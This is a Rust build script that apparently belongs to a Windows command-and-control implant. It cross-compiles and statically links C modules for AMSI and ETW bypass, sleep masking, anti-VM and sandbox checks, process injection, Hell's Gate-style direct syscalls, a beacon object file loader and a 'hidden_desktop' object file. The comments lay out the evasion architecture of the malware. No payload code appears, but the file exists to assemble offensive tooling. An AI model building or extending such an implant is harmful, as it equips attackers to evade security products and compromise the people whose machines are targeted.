// build.rs — compiles ALL C files into a static library, then links it
//
// CRITICAL FIX: Previous approach used `cargo:rustc-link-arg=<obj>` which
// places .o files AFTER Windows libraries in the linker command. This causes
// "undefined reference to __imp_LoadLibraryA" errors because the linker
// processes libraries left-to-right and discards unused symbols.
//
// NEW APPROACH: Compile all C files to .o, archive them into a single
// static library (libhero_native.a) using `ar`, then use `cargo:rustc-link-lib`
// which places the library at the right position to resolve all symbols.
//
// Additionally, we use `cargo:rustc-link-arg=-Wl,--whole-archive` to force
// the linker to include ALL symbols from our static library, even if they
// appear unused (Rust code calls them via FFI, which the linker may not see).
use std::path::Path;

fn main() {
    let target = std::env::var("TARGET").unwrap_or_default();
    println!("cargo:rerun-if-changed=build.rs");

    let cc = if target.contains("x86_64-pc-windows") { "x86_64-w64-mingw32-gcc" }
             else if target.contains("i686-pc-windows") { "i686-w64-mingw32-gcc" }
             else { "gcc" };
    // Use the matching `ar` tool
    let ar = if target.contains("x86_64-pc-windows") { "x86_64-w64-mingw32-ar" }
             else if target.contains("i686-pc-windows") { "i686-w64-mingw32-ar" }
             else { "ar" };

    let manifest_dir = std::env::var("CARGO_MANIFEST_DIR")
        .unwrap_or_else(|_| ".".to_string());
    let crate_root = Path::new(&manifest_dir);

    println!("cargo:warning=[BUILD] crate_root = {}", crate_root.display());
    println!("cargo:warning=[BUILD] target = {}", target);
    println!("cargo:warning=[BUILD] cc = {}", cc);
    println!("cargo:warning=[BUILD] ar = {}", ar);

    // ── For non-Windows (cargo check on Linux), set placeholder BOF ──
    if !target.contains("windows") {
        let out_dir = std::env::var("OUT_DIR").unwrap_or_else(|_| ".".to_string());
        let placeholder = format!("{}/.empty_bof", out_dir);
        let _ = std::fs::write(&placeholder, b"");
        let abs = std::fs::canonicalize(&placeholder)
            .unwrap_or_else(|_| std::path::PathBuf::from(&placeholder));
        println!("cargo:rustc-env=HIDDEN_DESKTOP_BOF={}", abs.display());
        return;
    }

    // ═══════════════════════════════════════════════════════════════════════
    // WINDOWS BUILD
    // ═══════════════════════════════════════════════════════════════════════

    let out_dir = std::env::var("OUT_DIR").unwrap_or_else(|_| ".".to_string());

    // ── Object output directory ─────────────────────────────────────────────
    // Agent-internal C artifacts (.o / .a) now compile straight into cargo's
    // OUT_DIR (under target/) — the old implant/bof/compiled/ path is retired.
    // BOF .o artifacts go to <root>/bofs/bofs_out/ (see section 5).
    let obj_output_dir = std::path::PathBuf::from(
        std::env::var("OUT_DIR").unwrap_or_else(|_| ".".to_string()),
    );
    let _ = std::fs::create_dir_all(&obj_output_dir);
    let obj_output_str = obj_output_dir.to_string_lossy().to_string();
    println!("cargo:warning=[BUILD] Object output dir: {}", obj_output_str);

    // ── 1. Link Windows libraries (needed by all C files) ──
    let win_libs = [
        "kernel32", "advapi32", "iphlpapi", "netapi32", "shell32",
        "psapi", "user32", "gdi32", "dbghelp", "userenv",
        "ntdll", "ws2_32", "bcrypt", "winmm",
        "setupapi",  // PCI device enumeration (anti_vm hardened)
        "shlwapi",   // path utilities
        "winhttp",   // v9: trueip — public-IP echo via documented WinHTTP API
        "msvcrt",    // C runtime: strcmp, memcpy, vsnprintf, etc.
    ];
    for lib in &win_libs {
        println!("cargo:rustc-link-lib={}", lib);
    }

    // ── 2. Compile ALL C files to object files ──
    // Shadow7 sleepmask C sources — replaces old sleep_mask.c (RC4/XOR/Wipe)
    // phantom_eng.c and phantom_impl.c compile normally.
    // phantom_asm.S is assembled separately (gcc handles .S with -x assembler-with-cpp).
    let c_files: Vec<(&str, &str)> = vec![
        ("evasion/amsi.c",                      "evasion_amsi"),
        ("evasion/etw.c",                        "evasion_etw"),
        // Shadow7: old sleep_mask.c REMOVED — replaced by 3 phantom files below
        ("evasion/sleepmask/phantom_impl.c",    "phantom_impl"),
        ("evasion/sleepmask/phantom_eng.c",     "phantom_eng"),
        ("evasion/anti_vm.c",                   "evasion_anti_vm"),
        // Chain evasion checks (Phase 3-5)
        ("evasion/exec_gap.c",                  "evasion_exec_gap"),
        ("evasion/env_maturity.c",              "evasion_env_maturity"),
        ("evasion/net_probe.c",                 "evasion_net_probe"),
        // injection / syscall
        // (bof_loader.c moved to <root>/bofs/loader/ — compiled separately below)
        ("injection/inject.c",                  "injection_inject"),
        ("syscall/syscall_stubs.c",             "syscall_stubs"),
        // HERO GATE syscall engine — isolated module (no Shadow7 shared state)
        // hero_peb_walking.c : PEB walk + SSN resolver (Hell's Gate / Halo fallback)
        // forge.c            : stub forge engine (RW alloc → write → RX flip)
        // exec.c             : hs_exec_run() — dual-path verification (production: unused at runtime)
        // syscall_mask.c     : sm_init() / sm_Nt*() wrappers — 4 high-risk syscalls only
        ("evasion/syscalls/hero_peb_walking.c", "hero_peb_walking"),
        ("evasion/syscalls/forge.c",            "hero_forge"),
        ("evasion/syscalls/exec.c",             "hero_exec"),
        ("evasion/syscalls/syscall_mask.c",     "syscall_mask"),
    ];

    let src_root = crate_root.join("src/core_agent");
    let mut compiled_objs: Vec<String> = Vec::new();

    for (rel_path, out_name) in &c_files {
        let src_path = src_root.join(rel_path);
        let out_path = format!("{}/{}.o", obj_output_str, out_name);

        if !src_path.exists() {
            println!("cargo:warning=[BUILD] Source not found: {}", src_path.display());
            continue;
        }

        println!("cargo:warning=[BUILD] Compiling {} → {}", src_path.display(), out_path);

        let args: Vec<String> = vec![
            "-c".into(),
            "-O2".into(),
            "-Wall".into(),
            // BUILD COMPAT (GCC 8+): The HERO syscall/PEB-walk C source uses
            // dense single-line `if(...) a; b; if(...) c;` patterns on purpose
            // (compact shellcode-friendly code). GCC's -Wmisleading-indentation
            // diagnostic (auto-on under -Wall) trips on these. The warning is
            // stylistic only — no behavior change. Suppress it so the dense
            // style stays and build.rs's FAILED-on-stderr-warning detection
            // does not falsely trip.
            "-Wno-misleading-indentation".into(),
            "-m64".into(),
            "-fno-exceptions".into(),
            "-fno-unwind-tables".into(),
            "-fno-asynchronous-unwind-tables".into(),
            "-fno-ident".into(),
            "-o".into(),
            out_path.clone(),
            src_path.to_string_lossy().to_string(),
        ];

        let output = std::process::Command::new(cc)
            .args(&args)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .output();

        match output {
            Ok(out) if out.status.success() => {
                compiled_objs.push(out_path.clone());
                println!("cargo:rerun-if-changed={}", src_path.display());
                println!("cargo:warning=[BUILD] OK: {}", rel_path);
            }
            Ok(out) => {
                println!("cargo:warning=[BUILD] FAILED (exit {:?}): {}", out.status.code(), rel_path);
                let stderr = String::from_utf8_lossy(&out.stderr);
                for line in stderr.lines().take(20) {
                    println!("cargo:warning=[GCC] {}", line);
                }
            }
            Err(e) => {
                println!("cargo:warning=[BUILD] ERROR executing {}: {}", cc, e);
            }
        }
    }

    // Syscall module rerun-if-changed hooks
    let syscall_dir = src_root.join("evasion/syscalls");
    for sf in &["hero_peb_walking.c","forge.c","exec.c","syscall_mask.c","hero_peb_walking.h","syscall_mask.h"] {
        println!("cargo:rerun-if-changed={}", syscall_dir.join(sf).display());
    }

    // ── 2a. BOF/COFF loader (agent-internal machinery) ─────────────────────
    // Source lives in the root BOF workspace: <root>/bofs/loader/bof_loader.c
    // Path is repo-root relative (../../ from the agent_core crate root).
    // The Go payload builder copies <root>/bofs/ next to implant/ in temp
    // builds, so this relative path holds there too.
    {
        let loader_src = crate_root.join("../../bofs/loader/bof_loader.c");
        let loader_out = format!("{}/bof_loader.o", obj_output_str);

        if loader_src.exists() {
            println!("cargo:warning=[BUILD] Compiling {} → {}", loader_src.display(), loader_out);
            println!("cargo:rerun-if-changed={}", loader_src.display());

            let loader_args: Vec<String> = vec![
                "-c".into(), "-O2".into(), "-Wall".into(), "-m64".into(),
                "-fno-exceptions".into(),
                "-fno-unwind-tables".into(),
                "-fno-asynchronous-unwind-tables".into(),
                "-fno-ident".into(),
                "-o".into(), loader_out.clone(),
                loader_src.to_string_lossy().to_string(),
            ];

            match std::process::Command::new(cc)
                .args(&loader_args)
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .output()
            {
                Ok(out) if out.status.success() => {
                    compiled_objs.push(loader_out);
                    println!("cargo:warning=[BUILD] OK: bofs/loader/bof_loader.c");
                }
                Ok(out) => {
                    println!("cargo:warning=[BUILD] FAILED (exit {:?}): bofs/loader/bof_loader.c", out.status.code());
                    let stderr = String::from_utf8_lossy(&out.stderr);
                    for line in stderr.lines().take(20) {
                        println!("cargo:warning=[GCC] {}", line);
                    }
                }
                Err(e) => {
                    println!("cargo:warning=[BUILD] ERROR executing {}: {}", cc, e);
                }
            }
        } else {
            println!("cargo:warning=[BUILD] BOF loader not found: {}", loader_src.display());
        }
    }

    // ── 2b. Compile phantom_asm.S (Shadow7 assembly trampoline) ──
    // .S files need -x assembler-with-cpp flag — gcc handles this correctly
    // with mingw64 cross-compiler on Linux.
    {
        let asm_src = src_root.join("evasion/sleepmask/phantom_asm.S");
        let asm_out = format!("{}/phantom_asm.o", obj_output_str);

        if asm_src.exists() {
            println!("cargo:warning=[BUILD] Assembling {} → {}", asm_src.display(), asm_out);
            println!("cargo:rerun-if-changed={}", asm_src.display());

            let asm_output = std::process::Command::new(cc)
                .args(&[
                    "-c",
                    "-x", "assembler-with-cpp",  // treat .S as asm with preprocessor
                    "-m64",
                    "-o", &asm_out,
                    &asm_src.to_string_lossy(),
                ])
                .stdout(std::process::Stdio::piped())
                .stderr(std::process::Stdio::piped())
                .output();

            match asm_output {
                Ok(out) if out.status.success() => {
                    compiled_objs.push(asm_out.clone());
                    println!("cargo:warning=[BUILD] OK: phantom_asm.S");
                }
                Ok(out) => {
                    println!("cargo:warning=[BUILD] FAILED assembling phantom_asm.S");
                    let stderr = String::from_utf8_lossy(&out.stderr);
                    for line in stderr.lines().take(20) {
                        println!("cargo:warning=[ASM] {}", line);
                    }
                }
                Err(e) => {
                    println!("cargo:warning=[BUILD] ERROR executing {} for .S: {}", cc, e);
                }
            }
        } else {
            println!("cargo:warning=[BUILD] phantom_asm.S not found at: {}", asm_src.display());
        }
    }

    // ── 3. Archive all .o files into a static library ──
    // This is the KEY FIX: static libs are placed correctly by the linker
    let static_lib = format!("{}/libhero_native.a", obj_output_str);

    // Delete old archive if exists
    let _ = std::fs::remove_file(&static_lib);

    // Build ar command: ar rcs <output.a> <obj1.o> <obj2.o> ...
    let mut ar_cmd = std::process::Command::new(ar);
    ar_cmd.arg("rcs").arg(&static_lib);
    for obj in &compiled_objs {
        ar_cmd.arg(obj);
    }

    println!("cargo:warning=[BUILD] Archiving {} objects → {}", compiled_objs.len(), static_lib);

    match ar_cmd.status() {
        Ok(s) if s.success() => {
            println!("cargo:warning=[BUILD] Static library created: {}", static_lib);
        }
        Ok(s) => {
            println!("cargo:warning=[BUILD] ar failed (exit {:?})", s.code());
        }
        Err(e) => {
            println!("cargo:warning=[BUILD] ERROR executing ar: {}", e);
        }
    }

    // ── 4. Link the static library BEFORE Windows libraries ──
    // --whole-archive forces linker to include ALL symbols (needed because
    // Rust calls C functions via FFI, which the linker may not see as "used")
    println!("cargo:rustc-link-search=native={}", obj_output_str);
    println!("cargo:rustc-link-arg=-Wl,--whole-archive");
    println!("cargo:rustc-link-lib=static=hero_native");
    println!("cargo:rustc-link-arg=-Wl,--no-whole-archive");

    // ═══════════════════════════════════════════════════════════════════════
    // 5. Compile hidden_desktop BOF (embedded via include_bytes!)
    // ═══════════════════════════════════════════════════════════════════════
    // BOF SOURCE LAYOUT (operator convention):
    //   - ALL BOF implementation sources (.c) live in <root>/bofs/bofs_src/
    //   - ALL BOF build outputs (.o) land in <root>/bofs/bofs_out/
    //   - The loader lives in <root>/bofs/loader/ (agent-internal, not a BOF)
    let bof_candidates = [
        crate_root.join("../../bofs/bofs_src/hidden_desktop.c"),
    ];

    let mut bof_compiled = false;
    let bofs_out_dir = crate_root.join("../../bofs/bofs_out");
    let _ = std::fs::create_dir_all(&bofs_out_dir);
    let bof_out = bofs_out_dir.join("hidden_desktop.x64.o").to_string_lossy().to_string();

    for bof_src in &bof_candidates {
        if !bof_src.exists() {
            println!("cargo:warning=[BUILD] BOF not found at: {}", bof_src.display());
            continue;
        }

        println!("cargo:warning=[BUILD] Found BOF: {}", bof_src.display());

        let output = std::process::Command::new(cc)
            // -nostdlib dropped: it is a LINK-time flag (no-op with -c)
            // and breaks non-gnu gcc drivers (e.g. zig cc) header search.
            .args(&["-DBOF", "-c", "-O2", "-Wall",
                    "-fno-exceptions", "-fno-unwind-tables",
                    "-fno-asynchronous-unwind-tables", "-fno-ident",
                    "-o", &bof_out,
                    &bof_src.to_string_lossy()])
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .output();

        match output {
            Ok(out) if out.status.success() => {
                let abs = std::fs::canonicalize(&bof_out)
                    .unwrap_or_else(|_| std::path::PathBuf::from(&bof_out));
                println!("cargo:rustc-env=HIDDEN_DESKTOP_BOF={}", abs.display());
                println!("cargo:rerun-if-changed={}", bof_src.display());
                bof_compiled = true;
                println!("cargo:warning=[BUILD] BOF compiled OK → {}", abs.display());
                break;
            }
            Ok(out) => {
                println!("cargo:warning=[BUILD] BOF compilation failed (exit {:?})", out.status.code());
                let stderr = String::from_utf8_lossy(&out.stderr);
                for line in stderr.lines().take(15) {
                    println!("cargo:warning=[GCC] {}", line);
                }
            }
            Err(e) => {
                println!("cargo:warning=[BUILD] ERROR executing gcc for BOF: {}", e);
            }
        }
    }

    if !bof_compiled {
        println!("cargo:warning=[BUILD] BOF not compiled — creating empty placeholder");
        let placeholder = format!("{}/.empty_bof", out_dir);
        let _ = std::fs::write(&placeholder, b"");
        let abs = std::fs::canonicalize(&placeholder)
            .unwrap_or_else(|_| std::path::PathBuf::from(&placeholder));
        println!("cargo:rustc-env=HIDDEN_DESKTOP_BOF={}", abs.display());
    }
}
